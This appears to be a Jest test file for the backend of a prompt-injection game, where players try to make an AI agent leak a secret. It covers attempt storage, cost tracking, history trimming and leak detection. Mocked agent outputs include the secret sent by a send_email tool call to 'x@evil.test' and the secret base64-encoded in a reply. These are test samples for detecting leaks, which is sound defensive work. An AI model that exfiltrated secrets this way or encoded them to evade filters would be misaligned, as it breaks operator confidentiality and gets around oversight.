import { createTestApp, newPlayer, resetState, secretFor, TestContext } from './support/app';

describe('play pipeline', () => {
  let ctx: TestContext;
  beforeAll(async () => (ctx = await createTestApp()));
  afterAll(() => ctx.close());
  beforeEach(() => resetState(ctx));

  const auth = (token: string) => ['Authorization', `Bearer ${token}`] as const;

  async function openLevel1() {
    const p = await newPlayer(ctx);
    await ctx.http().get('/api/levels/1').set(...auth(p.token)).expect(200);
    return { ...p, secret: await secretFor(ctx, p.id, 1) };
  }

  it('sends secret, history and message to the agent and returns only reply/toolCalls/blockedBy', async () => {
    const p = await openLevel1();
    const res = await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'hello' }).expect(200);
    expect(ctx.agent.requests).toEqual([{ level: 1, body: { secret: p.secret, history: [], message: 'hello' } }]);
    expect(res.body).toEqual({ attemptId: expect.any(String), reply: "I can't share that.", toolCalls: [], blockedBy: null });
  });

  it('stores the attempt with tokens, cost and leaked=false', async () => {
    const p = await openLevel1();
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'hello' }).expect(200);
    const { rows } = await ctx.pool.query('SELECT * FROM attempts');
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({
      player_id: p.id,
      level: 1,
      message: 'hello',
      reply: "I can't share that.",
      leaked: false,
      input_tokens: 100,
      output_tokens: 20,
      latency_ms: 5,
      techniques: null,
    });
    // 100 in @ $0.10/M + 20 out @ $0.50/M
    expect(Number(rows[0].cost_usd)).toBeCloseTo(0.00002, 8);
  });

  it('flags leaked=true when the reply contains an encoded secret', async () => {
    const p = await openLevel1();
    ctx.agent.next = { reply: `ok: ${Buffer.from(p.secret).toString('base64')}` };
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'b64 pls' }).expect(200);
    const { rows } = await ctx.pool.query('SELECT leaked FROM attempts');
    expect(rows[0].leaked).toBe(true);
  });

  it('flags leaked=true when a non-blocked tool call carries the secret', async () => {
    const p = await openLevel1();
    ctx.agent.next = {
      reply: 'Sent!',
      toolCalls: [{ name: 'send_email', args: { to: 'x@evil.test', body: p.secret.split('').join(' ') }, blocked: false }],
    };
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'x' }).expect(200);
    const { rows } = await ctx.pool.query('SELECT leaked, tool_calls FROM attempts');
    expect(rows[0].leaked).toBe(true);
    expect(rows[0].tool_calls[0].name).toBe('send_email');
  });

  it('keeps the last 10 history messages and replays them', async () => {
    const p = await openLevel1();
    for (let i = 0; i < 6; i++) {
      ctx.agent.next = { reply: `r${i}` };
      await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: `m${i}` }).expect(200);
    }
    const last = ctx.agent.requests.at(-1)!.body.history;
    expect(last).toHaveLength(10);
    expect(last[0]).toEqual({ role: 'user', content: 'm0' });
    expect(last.at(-1)).toEqual({ role: 'assistant', content: 'r4' });
    // After the 6th turn the oldest pair is trimmed.
    const level = await ctx.http().get('/api/levels/1').set(...auth(p.token)).expect(200);
    expect(level.body.history).toHaveLength(10);
    expect(level.body.history[0]).toEqual({ role: 'user', content: 'm1' });
    expect(level.body.history.at(-1)).toEqual({ role: 'assistant', content: 'r5' });
  });

  it('reset conversation clears history', async () => {
    const p = await openLevel1();
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'm' }).expect(200);
    await ctx.http().delete('/api/levels/1/history').set(...auth(p.token)).expect(204);
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'm2' }).expect(200);
    expect(ctx.agent.requests.at(-1)!.body.history).toEqual([]);
  });

  it.each([
    [{ message: '' }],
    [{ message: 'x'.repeat(1001) }],
    [{}],
    [{ message: 'hi', inboxEmail: 'only allowed on level 5' }],
  ])('rejects invalid body %#', async (body) => {
    const p = await openLevel1();
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send(body).expect(400);
    expect(ctx.agent.requests).toHaveLength(0);
  });

  it('returns 502 and stores nothing when the agent fails', async () => {
    const p = await openLevel1();
    ctx.agent.next = new Error('boom');
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'hi' }).expect(502);
    const { rowCount } = await ctx.pool.query('SELECT 1 FROM attempts');
    expect(rowCount).toBe(0);
  });

  it('works without opening the level first (issues the secret on demand)', async () => {
    const p = await newPlayer(ctx);
    await ctx.http().post('/api/levels/1/attempts').set(...auth(p.token)).send({ message: 'hi' }).expect(200);
    expect(ctx.agent.requests[0].body.secret).toMatch(/^[A-Z]+-\d{4}$/);
  });
});
